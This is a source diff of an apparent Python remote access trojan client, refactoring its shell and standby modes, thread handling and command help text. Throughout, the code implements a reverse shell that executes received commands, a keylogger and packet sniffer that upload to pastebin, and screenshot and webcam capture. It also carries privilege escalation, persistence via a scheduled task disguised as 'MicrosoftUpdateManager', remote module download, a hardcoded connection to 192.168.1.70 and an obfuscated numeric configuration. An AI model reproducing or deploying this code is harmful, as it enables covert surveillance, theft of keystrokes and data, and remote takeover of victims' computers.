@@ -48,6 +48,7 @@ import sys
 import time
 import json
 import socket
+import threading
 import subprocess
 from mss import mss
 from uuid import uuid1
@@ -58,7 +59,6 @@ from platform import uname
 from imp import new_module
 from zipfile import ZipFile
 from requests import request
-from threading import Thread
 from logging import getLogger
 from urllib import urlretrieve
 from Crypto.Cipher import AES
@@ -99,7 +99,7 @@ class Client(object):
 
     # ------------------- private functions -------------------------
 
-    def _help(self, *arg): return '\n'.join(['{}{:>90}'.format(cmd, self._commands[cmd].func_doc) for cmd in self._commands]) if not len(arg) else self._help_command(arg[0])
+    def _help(self, *arg): return '\n ' + '\n '.join(['{}\t\t{}'.format(i.usage, i.func_doc) for i in self._commands.values()])
 
     def _help_command(self, cmd): return getattr(self, cmd).func_doc if cmd in self._commands else "'{}' not found".format(cmd)
     
@@ -147,7 +147,7 @@ class Client(object):
 
 
     def _keylogger(self):
-        self._threads['keylogger'] = Thread(target=self._keylogger_manager, name=time.time())
+        self._threads['keylogger'] = threading.Thread(target=self._keylogger_manager, name='keylogger')
         self._threads['keylogger'].start()
         result = 'Keylogger started at {}'.format(time.ctime())
         self._result['keylogger'].update({ time.ctime() : result })
@@ -372,46 +372,37 @@ class Client(object):
             fx.options   = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
             fx.status    = True if sys.platform in fx.platforms else False
             mx.update({fx.func_name: fx})
-            cx.update({fx.func_name: fx})
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
-            fx.options   = {'max_bytes': 1024, 'next_upload': time.time() + 300.0, 'buffer': bytes(), 'window': None}
+            fx.options   = {'max_bytes': 512, 'next_upload': time.ctime(time.time() + 300.0), 'buffer': bytes(), 'window': None}
             fx.status    = True if sys.platform in fx.platforms else False
             mx.update({fx.func_name: fx})
-            cx.update({fx.func_name: fx})
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
             fx.options   = {'image': True, 'video': bool()}
             fx.status    = True if sys.platform in fx.platforms else False
             mx.update({fx.func_name: fx})
-            cx.update({fx.func_name: fx})
         elif fx.func_name is 'packetsniff':
             fx.platforms = ['darwin','linux2']
-            fx.options   = { 'next_upload': time.time() + 300.0, 'buffer': []}
+            fx.options   = { 'next_upload': time.ctime(time.time() + 300.0), 'buffer': []}
             fx.status    = True if sys.platform in fx.platforms else False
             mx.update({fx.func_name: fx})
-            cx.update({fx.func_name: fx})
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.options   = {}
             fx.status    = True if sys.platform in fx.platforms else False
             mx.update({fx.func_name: fx})
-            cx.update({fx.func_name: fx})
         elif fx.func_name is 'standby':
             fx.platforms = ['win32','linux2','darwin']
-            fx.options   = {'next_run': time.time() + 300.0}
-            fx.status    = False
+            fx.options   = {'next_run': time.ctime(time.time() + 300.0)}
+            fx.status    = threading.Event()
             mx.update({fx.func_name: fx})
-            cx.update({fx.func_name: fx})
         elif fx.func_name is 'shell':
             fx.platforms = ['win32','linux2','darwin']
             fx.options   = {}
-            fx.status    = True
+            fx.status    = threading.Event()
             mx.update({fx.func_name: fx})
-            cx.update({fx.func_name: fx})            
-        else:
-            __command__[fx.func_name] = fx
-            cx.update({fx.func_name: fx})
+        cx.update({fx.func_name: fx})
         return fx
 
     def _options(self, *module):
@@ -430,14 +421,14 @@ class Client(object):
             
     def _show(self, target):
         try:
-            results = json.dumps(target, indent=2, separators=(',','\t\t'), sort_keys=True)
+            results = json.dumps(target, indent=2, separators=(',','\ti'), sort_keys=True)
         except:
             try:
                 string_repr = repr(target)
                 string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
                 string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
                 string_repr = string_repr.replace('(', '[').replace(')', ']')
-                results     = json.dumps(json.loads(string_repr), indent=2, separators=(',', '\t\t'), sort_keys=True)
+                results     = json.dumps(json.loads(string_repr), indent=2, separators=(',', '\t'), sort_keys=True)
             except:
                 results = repr(target)
         return results
@@ -535,7 +526,7 @@ class Client(object):
     def _run(self):
         for name, module in self._modules.items():
              if module.status and sys.platform in module.platforms:
-                self._threads[name] = Thread(target=module, name=name)
+                self._threads[name] = threading.Thread(target=module, name=name)
                 self._threads[name].daemon = True
         for task in self._threads.values():
             try:
@@ -549,49 +540,57 @@ class Client(object):
         return self._show(self._result)
 
     def _shell(self):
+        self.standby.status.clear()
+        print 'standby mode off'
+        self.shell.status.set()
+        print 'shell mode on'
         while True:
-            if not self.shell.status:
-                break
+            self.shell.status.wait()
+            prompt = "[%d @ {}]> ".format(os.getcwd())
+            self._send(prompt, method='prompt')   
+            data = self._receive()
+            if not data:
+                continue
+            cmd, _, action = bytes(data).partition(' ')
+            if cmd in self._commands:
+                result = self._commands[cmd](action) if len(action) else self._commands[cmd]()
             else:
-                prompt = "[%d @ {}]> ".format(os.getcwd())
-                self._send(prompt, method='prompt')   
-                data = self._receive()
-                if not data:
-                    continue
-                cmd, _, action = bytes(data).partition(' ')
-                if cmd in self._commands:
-                    result = self._commands[cmd](action) if len(action) else self._commands[cmd]()
-                else:
-                    result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-                if result and len(result):
-                    result = '\n' + str(result) + '\n'
-                    self._send(result, method=cmd)
+                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+            if result and len(result):
+                result = '\n' + str(result) + '\n'
+                self._send(result, method=cmd)
+            if not self.shell.status.is_set():
+                break
         return self.standby()
 
     def _standby(self):
+        self.shell.status.clear()
+        self.standby.status.set()
         while True:
-            if not self.standby.status:
+            self.standby.status.wait()
+            b = self._receive()
+            if b and len(b):
+                self.standby.status.clear()
+                self.shell.status.set()
                 break
+            elif time.time() > time.mktime(time.strptime(self.standby.options['next_run'])):
+                self._send(self._run(), method='standby')
+                self.standby.options['next_run'] = time.ctime(time.mktime(time.strptime(self.standby.options['next_run'])) + 300.0)
             else:
-                if time.time() > self.standby.options['next_run']:
-                    self.run()
                 time.sleep(1)
-                b = self._receive()
-                if b and len(b):
-                    self._enable('shell')
         return self.shell()
             
     def _start(self):
         try:
-            self._socket  = self._connect(host=self._target(o=self.__a__, p=self.__b__))
+            self._socket  = self._connect(host='192.168.1.70') #self._connect(host=self._target(o=self.__a__, p=self.__b__))
             self._dhkey   = self._diffiehellman()
             while True:
                 if self._exit:
                     break
-                elif self.shell.status:
+                try:
                     self.shell()
-                elif self.standby.status:
-                    self.standby()
+                except KeyboardInterrupt:
+                    break
         except Exception as e:
             if self.__v__:
                 print "Error: '{}'".format(str(e))
@@ -617,27 +616,20 @@ class Client(object):
     def _keylogger_helper(self):
         while True:
             if self._exit:
-                if len(self.keylogger.options['buffer']):
-                    result  = self._pastebin(self.keylogger.options['buffer'])
-                    if self.standby.status:
-                        self._logger.log(40, result, extra={'submodule':'keylogger'})
-                    else:
-                        self._result['keylogger'].update({time.ctime(): result})
                 break
-            if time.time() < self.keylogger.options['next_upload']:
-                time.sleep(1)
-            else:
+            if time.time() > time.mktime(time.strptime(self.keylogger.options['next_upload'])):
                 if len(self.keylogger.options['buffer']) > self.keylogger.options['max_bytes']:
                     result  = self._pastebin(self.keylogger.options['buffer'])
-                    if self.standby.status:
+                    if self.standby.status.is_set():
                         self._logger.log(40, result, extra={'submodule':'keylogger'})
-                    else:
-                        self._result['keylogger'].update({time.ctime(): result})
+                    self._result['keylogger'].update({time.ctime(): result})
                     self.keylogger.options['buffer']  = ''
-                self.keylogger.options['next_upload'] = time.time() + 300.0
+                self.keylogger.options['next_upload'] = time.ctime(time.mktime(time.strptime(self.keylogger.options['next_upload'])) + 300.0)
+            else:
+                time.sleep(1)
 
     def _keylogger_manager(self):
-            self._threads['keylogger_helper'] = Thread(target=self._keylogger_helper, name=time.time())
+            self._threads['keylogger_helper'] = threading.Thread(target=self._keylogger_helper, name='keylogger_helper')
             self._threads['keylogger_helper'].start()
             while True:
                 if self._exit:
@@ -822,10 +814,11 @@ class Client(object):
     def _persistence_add_scheduled_task(self):
         if self.__f__:
             tmpdir      = gettempdir()
-            if os.path.basename(self.__f__) not in os.listdir(tmpdir):
-                os.popen('copy {} {}'.format(self.__f__, tmpdir) if os.popen is 'nt' else 'cp {} {}'.format(self.__f__, tmpdir)).read()
-            task_run    = os.path.join(tmpdir, long_to_bytes(long(self.__f__)))
             task_name   = 'MicrosoftUpdateManager'
+            task_run    = os.path.join(tmpdir, long_to_bytes(long(self.__f__)))
+            copy        = 'copy' if os.name is 'nt' else 'cp'
+            if not os.path.isfile(task_run):
+                backup  = os.popen(' '.join(copy, long_to_bytes(long(self.__f__)), task_run)).read()
             try:
                 if subprocess.call('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                     return True
@@ -981,224 +974,196 @@ class Client(object):
 
     @_command
     def pwd(self):
-        """
-        usage:          pwd
-        description:    present working directory
-        """
+        """\tpresent working directory"""
         return os.getcwd()
 
     @_command
     def run(self):
-        """
-        usage:          run
-        description:    run enabled client modules
-        """
+        """\trun enabled client modules"""
         return self._run()
 
     @_command
     def kill(self):
-        """
-        usage:          kill
-        description:    kill client
-        """
+        """\tkill client"""
         return self._kill()
 
     @_command
     def cd(self, *x):
-        """
-        usage:          cd <path>
-        description:    change directory
-        """
+        """change directory"""
         return self._cd(*x)
 
     @_command
     def set(self, x):
-        """
-        usage:          set <module> [option]=[value]
-        description:    set module options
-        """
+        """set module options"""
         return self._set(x)
 
     @_command
     def ls(self, *x):
-        """
-        usage:          ls <path>
-        description:    list directory contents
-        """
+        """list directory contents"""
         return self._ls(*x)
 
     @_command
     def admin(self):
-        """
-        usage:          admin
-        description:    attempt to escalate privileges
-        """
+        """\tattempt to escalate privileges"""
         return self._admin()
     
     @_command
     def start(self):
-        """
-        usage:          start
-        description:    start client
-        """
+        """\tstart client"""
         return self._start()
     
     @_command
     def shell(self):
-        """
-        usage:          shell
-        description:    run client shell
-        """
+        """\trun client shell"""
         return self._shell()
     
     @_command
     def new(self, x):
-        """
-        usage:          new <url>
-        description:    download new module from url
-        """
+        """download new module from url"""
         return self._new(x)
 
     @_command
     def show(self, x):
-        """
-        usage:          show <option>
-        description:    show client attributes
-        """
+        """show client attributes"""
         return self._show(x)
 
     @_command
     def standby(self):
-        """
-        usage:          standby
-        description:    revert to standby mode
-        """
+        """revert to standby mode"""
         return self._standby()
 
     @_command
     def wget(self, target):
-        """
-        usage:          wget <url>
-        description:    download file from url
-        """
+        """download file from url"""
         return self._wget()
 
     @_command
     def options(self,*arg):
-        """
-        usage:          options
-        description:    display module options
-        """
+        """display module options"""
         return self._options(*arg)
 
     @_command
     def jobs(self):
-        """
-        usage:          jobs
-        description:    list currently active jobs
-        """
+        """\tlist currently active jobs"""
         return self._show(self._threads)
     
     @_command
     def enable(self, module):
-        """
-        usage:          enable <module>
-        description:    enable module
-        """
+        """enable module"""
         return self._enable(module)
 
     @_command
     def disable(self, module):
-        """
-        usage:          disable <module>
-        description:    disable module
-        """
+        """disable module"""
         return self._disable(module)
 
     @_command
     def results(self):
-        """
-        usage:          results
-        description:    show all modules output
-        """
+        """show all modules output"""
         return self._show(self._result)
 
     @_command
+    def status(self):
+        """get client session status"""
+        return self._status()
+
+    @_command
     def help(self, *args):
-        """
-        usage:          help [option]
-        description:    show command usage information
-        """
+        """show command usage information"""
         return self._help(*args)
 
     @_command
     def info(self):
-        """
-        usage:          info
-        description:    get client host machine information
-        """
+        """\tget client host machine information"""
         return self._show(self._info)
 
     @_command
     def commands(self):
-        """
-        usage:          commands
-        description:    list commands with usage help
-        """
-        return self._help_commands()
+        """list commands with usage help"""
+        return self._help_command()
 
     @_command
     def modules(self):
-        """
-        usage:          modules
-        description:    list modules current status
-        """
+        """list modules current status"""
         return self._help_modules()
 
     @_command
     def webcam(self):
-        """
-        usage:          webcam
-        description:    remote image/video capture from client webcam
-        """
+        """\tremote image/video capture from client webcam"""
         return self._webcam()
     
     @_command
     def keylogger(self):
-        """
-        usage:          keylogger
-        description:    log client keystrokes remotely and dump to pastebin
-        """
+        """log client keystrokes remotely and dump to pastebin"""
         return self._keylogger()
 
     @_command
     def screenshot(self):
-        """
-        usage:          screenshot
-        description:    take screenshot and upload to imgur
-        """
+        """take screenshot and upload to imgur"""
         return self._screenshot()
 
     @_command
     def persistence(self):
-        """
-        usage:          persistence
-        description:    establish persistence to relaunch on reboot
-        """
+        """establish persistence to relaunch on reboot"""
         return self._persistence()
     
     @_command
     def packetsniff(self):
-        """
-        usage:          packetsniff
-        description:    capture client network traffic and dump to pastebin
-        """
+        """capture client network traffic and dump to pastebin"""
         return self._packetsniff()
+
+    pwd.usage           = 'pwd'
+    run.usage           = 'run'
+    kill.usage          = 'kill'
+    info.usage          = 'info'
+    jobs.usage          = 'jobs'
+    admin.usage         = 'admin'
+    start.usage         = 'start'
+    shell.usage         = 'shell'
+    webcam.usage        = 'webcam'
+    status.usage        = 'status'
+    options.usage       = 'options'
+    results.usage       = 'results'
+    standby.usage       = 'standby'
+    modules.usage       = 'modules'
+    commands.usage      = 'commands'
+    keylogger.usage     = 'keylogger'
+    screenshot.usage    = 'screenshot'
+    persistence.usage   = 'persistence'
+    packetsniff.usage   = 'packetsniff'
+    cd.usage            = 'cd <path>'
+    new.usage           = 'new <url>'
+    set.usage           = 'set <cmd> x=y'
+    help.usage          = 'help <option>'
+    show.usage          = 'show <option>'
+    ls.usage            = 'ls <path>'
+    wget.usage          = 'wget <url>'
+    disable.usage       = 'disable <cmd>'
+    enable.usage        = 'enable <cmd>'
 
 # -----------------   main   --------------------------
 
 def main(*args, **kwargs):
-    client = Client(**kwargs)
+    config = {
+            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
+            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
+            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
+            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
+            "__e__": "423224063517525567299427660991207813087967857812230603629111",
+            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
+            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
+            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
+            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
+            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
+            "__v__": "1",
+	    "__w__": "12095051301478169748777225282050429328988589300942044190524179185395659761404742",
+            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
+            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585",
+            "__f__": bytes(bytes_to_long(__file__))
+    }
+    client = Client(**config)
     return client.start()
 
+if __name__ == '__main__':
+    main()
 
